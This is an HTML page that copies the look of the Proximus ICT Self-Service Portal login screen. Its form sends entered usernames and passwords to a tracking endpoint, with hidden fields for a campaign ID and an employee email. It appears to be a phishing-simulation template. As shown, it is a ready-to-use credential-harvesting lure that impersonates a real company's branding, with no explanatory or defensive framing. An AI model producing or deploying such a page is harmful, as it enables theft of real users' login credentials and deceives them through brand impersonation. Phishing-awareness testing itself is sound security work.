<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proximus ICT Self-Service Portal</title>
    <link rel="icon" type="image/png" href="https://www.proximus.be/resources/cdn/brand/logos/logo-proximus.png">

    <style>
        div#login_container {
            display: block;
            clear: both;
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: Verdana, Geneva, sans-serif;
            font-size: 12px;
            font-weight: bold;
        }

        div#login_block {
            position: relative;
            top: 56px;
            margin: auto;
            padding: 14px;
            width: 612px;
            height: 375px;
            background-color: #EBE4F1;
            -webkit-border-bottom-right-radius: 20px;
            -moz-border-radius-bottomright: 20px;
            border-bottom-right-radius: 20px;
        }

        div#login_fields {
            width: 444px;
            margin: 70px 56px 56px 56px;
        }

        #login_fields fieldset {
            display: flex;
            justify-content: space-between;
            margin: 7px 0 7px 0;
            padding: 0;
            border: 0;
            clear: both;
            width: auto;
            height: 100%;
        }
    </style>
</head>

<body class="login_page" style="background-color: #5C2D91;
            margin: 0 -14px 0 0;">
    <div id="login_container" style="display:block;">
        <div id="login_block">
            <div id="logo">
                <img src="https://www.proximus.be/resources/cdn/brand/logos/logo-proximus.png" alt="Proximus Logo">
            </div>
            <div id="login_fields">
                <form id="form1" name="form1" action="/events/track_submitted" method="post">
                    <fieldset>
                        <label for="loginscreenusername">Username:</label>
                        <input class="split" id="loginscreenusername" type="text" name="email" maxlength="80" required>
                    </fieldset>
                    <fieldset>
                        <label for="loginscreenpassword">Password:</label>
                        <input class="split" id="loginscreenpassword" type="password" name="password" maxlength="40"
                            required>
                    </fieldset>
                    <input type="hidden" name="campaign_id" value="{{campaign_id}}">
                    <input type="hidden" name="employee_email" value="{{employee_email}}">
                    <p>
                        <span style="float:left; display:inline; "><a style="text-decoration: none;" href="#">Forgotten
                                your password?</a></span>
                    </p>
                    <div style="display: flex; flex-direction: column; align-items: flex-end; margin-top: 40px;">

                        <button class="login_button" type="submit" style="
                        text-decoration: none;
                        display: flex;
                        width: fit-content;
                        font-weight: bold;
                        clear: both;
                        float: right;
                        font-size: 14px;
                        line-height: 18px;
                        margin-bottom: 10px;
                        background-color: #5C2D91;
                        color: #ffffff;
                        border: none;
                        padding: 5px 20px 5px 20px;
                        -webkit-border-bottom-right-radius: 10px;
                        -moz-border-radius-bottomright: 10px;
                        border-bottom-right-radius: 10px;">
                            <p style="margin-top: auto; margin-bottom: auto;">
                                Login
                            </p>
                            <div>
                                <img style="scale: 0.6; margin-top: 4px;"
                                    src="https://i.postimg.cc/CxbQjRk9/right-arrow.png" alt="Login Icon"
                                    class="login_icon">
                            </div>
                        </button>
                        <div for="remember_me" style="float: right;">
                            <input type="checkbox" id="remember_me" name="remember_me" class="check"> Remember me
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>

</body>

</html>
